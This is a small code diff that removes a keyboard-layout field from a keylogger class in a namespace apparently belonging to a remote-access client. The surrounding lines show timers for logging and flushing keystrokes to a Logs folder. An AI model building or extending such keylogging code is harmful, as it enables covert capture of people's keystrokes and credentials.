@@ -71,7 +71,6 @@ namespace xClient.Core.Keylogger
                                             "\\Logs\\";
 
         private readonly List<int> _enumValues;
-        private IntPtr _activeKeyboardLayout;
         private readonly System.Timers.Timer _timerLogKeys;
         private readonly System.Timers.Timer _timerFlush;
 
